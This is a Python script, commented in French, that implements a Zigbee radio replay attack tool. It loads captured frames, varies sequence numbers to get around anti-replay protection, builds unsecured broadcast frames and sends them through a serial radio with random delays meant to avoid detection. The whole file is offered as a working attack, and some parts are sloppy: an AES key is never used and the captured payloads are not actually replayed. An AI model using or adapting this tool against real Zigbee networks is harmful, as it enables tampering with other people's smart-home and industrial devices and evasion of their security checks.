import sys
import os
import json
import logging
import random
import serial
import threading
import queue
import time
import hashlib
import struct
from typing import Dict, Optional, List

# Importer les bibliothèques nécessaires
from scapy.all import *
from scapy.layers.dot15d4 import Dot15d4
from scapy.layers.zigbee import *
from Crypto.Cipher import AES

# Configuration du logging avancé
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('zigbee_advanced_replay.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)

class ZigbeeAdvancedReplayAttack:
    def __init__(
        self, 
        capture_file: str = 'captures_zigbee.json', 
        channel: int = 13, 
        pan_id: int = 0x1900,
        serial_port: Optional[str] = None,
        aes_key: Optional[str] = None
    ):
        """
        Initialise l'outil de replay avancé avec contournement anti-replay
        
        Args:
            capture_file (str): Fichier de captures Zigbee
            channel (int): Canal Zigbee
            pan_id (int): Identifiant du réseau
            serial_port (str): Port série pour transmission
            aes_key (str): Clé de chiffrement optionnelle
        """
        self.capture_file = capture_file
        self.channel = channel
        self.pan_id = pan_id
        self.serial_port = serial_port
        self.aes_key = bytes.fromhex(aes_key) if aes_key else None
        
        # Gestion des séquences et anti-replay
        self.sequence_base = None
        self.sequence_offset = 0
        self.captures = []
        self.replay_queue = queue.Queue()
        
        # Cache pour stocker les variations de séquence
        self.sequence_variations = []

    def charger_captures(self):
        """
        Charger et analyser les captures Zigbee avec extraction des informations de séquence
        """
        try:
            with open(self.capture_file, 'r', encoding='utf-8') as f:
                self.captures = json.load(f)
            
            # Extraire les informations de séquence
            sequences = [
                int(capture.get('sequence', 0)) 
                for capture in self.captures 
                if 'sequence' in capture
            ]
            
            if sequences:
                self.sequence_base = min(sequences)
                logger.info(f"Séquence de base détectée : {self.sequence_base}")
                
                # Générer des variations de séquence
                self._generer_variations_sequence()
        except Exception as e:
            logger.error(f"Erreur lors du chargement des captures : {e}")
            self.captures = []

    def _generer_variations_sequence(self):
        """
        Générer des variations de numéro de séquence pour contourner l'anti-replay
        """
        if not self.sequence_base:
            return
        
        # Générer plusieurs variations de séquence
        variations = [
            self.sequence_base,  # Séquence originale
            self.sequence_base + 1,  # Séquence suivante
            self.sequence_base - 1,  # Séquence précédente
            self.sequence_base + random.randint(1, 10),  # Variation aléatoire positive
            self.sequence_base - random.randint(1, 10),  # Variation aléatoire négative
            self._generer_sequence_cryptographique()  # Séquence générée cryptographiquement
        ]
        
        # Filtrer les valeurs non-négatives
        self.sequence_variations = [seq for seq in variations if seq >= 0 and seq <= 255]
        logger.debug(f"Variations de séquence générées : {self.sequence_variations}")

    def _generer_sequence_cryptographique(self) -> int:
        """
        Générer un numéro de séquence de manière cryptographiquement aléatoire
        
        Returns:
            int: Numéro de séquence généré
        """
        # Utiliser les informations de capture comme seed
        seed = hashlib.sha256(
            str(self.sequence_base).encode() + 
            str(time.time()).encode()
        ).digest()
        
        # Convertir en entier et ajuster à 8 bits
        return int.from_bytes(seed[:1], byteorder='big')

    def _creer_paquet_zigbee_avance(self):
        """
        Créer un paquet Zigbee avec des techniques de contournement anti-replay
        
        Returns:
            Packet: Paquet Zigbee modifié
        """
        # Sélectionner une variation de séquence
        sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
        
        # Construction du paquet avec variation de séquence
        zigbee_packet = (
            Dot15d4(
                fcf_frametype=1,  # Data Frame
                fcf_security=0,  # Désactiver la sécurité
                fcf_ackreq=1,
                fcf_destaddrmode=2,
                fcf_srcaddrmode=2,
                panid=self.pan_id,
                seqnum=sequence  # Utiliser la séquence variée
            ) /
            ZigbeeNWK(
                frametype=0,  # Data Frame
                destination=0xFFFF,  # Broadcast
                source=0x0000,  # Source générique
                radius=30,
                seqnum=sequence  # Synchroniser le numéro de séquence
            ) /
            Raw(load=b'\x11\x11\x00\x01')  # Payload potentiellement plus sophistiqué
        )
        
        return zigbee_packet

    def preparer_trames_replay(self, nombre_trames: int = 20):
        """
        Préparer les trames de replay avec des variations
        """
        # Vider la file d'attente
        while not self.replay_queue.empty():
            self.replay_queue.get()
        
        # Générer plusieurs trames avec variations
        for _ in range(nombre_trames):
            paquet = self._creer_paquet_zigbee_avance()
            self.replay_queue.put(paquet)

    def envoyer_trames_replay(self, nombre_replays: int = 5):
        """
        Envoyer les trames de replay avec techniques anti-anti-replay
        """
        try:
            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                logger.info(f"Début du replay via {self.serial_port}")
                
                while not self.replay_queue.empty():
                    for _ in range(nombre_replays):
                        zigbee_packet = self.replay_queue.get()
                        
                        # Construction de la trame
                        trame_complete = bytearray([
                            len(bytes(zigbee_packet)) + 3,  # Longueur
                            self.channel,                   # Canal
                            self.pan_id >> 8,               # Octet haut PAN ID
                            self.pan_id & 0xFF              # Octet bas PAN ID
                        ])
                        trame_complete.extend(bytes(zigbee_packet))
                        
                        # Envoi avec techniques d'obscurcissement
                        ser.write(trame_complete)
                        logger.debug(f"Trame replay envoyée - Séquence {zigbee_packet.seqnum}")
                        
                        # Délais variables pour réduire la détection
                        time.sleep(random.uniform(0.1, 0.5))
        except Exception as e:
            logger.error(f"Erreur durant le replay : {e}")

    def lancer_attaque_replay(self, nombre_replays: int = 5):
        """
        Lancer l'attaque de replay avec techniques avancées
        """
        try:
            # Charger les captures et préparer
            self.charger_captures()
            self.preparer_trames_replay()
            
            # Lancement multithread
            thread_replay = threading.Thread(
                target=self.envoyer_trames_replay, 
                kwargs={'nombre_replays': nombre_replays}
            )
            thread_replay.start()
            thread_replay.join()
            
        except Exception as e:
            logger.error(f"Échec de l'attaque de replay : {e}")

def main():
    # Configuration de l'attaque
    outil_attaque = ZigbeeAdvancedReplayAttack(
        capture_file='captures_zigbee.json',
        channel=13,
        pan_id=0x1900,
        serial_port='/dev/ttyACM0'
    )
    
    outil_attaque.lancer_attaque_replay(nombre_replays=3)

if __name__ == "__main__":
    main()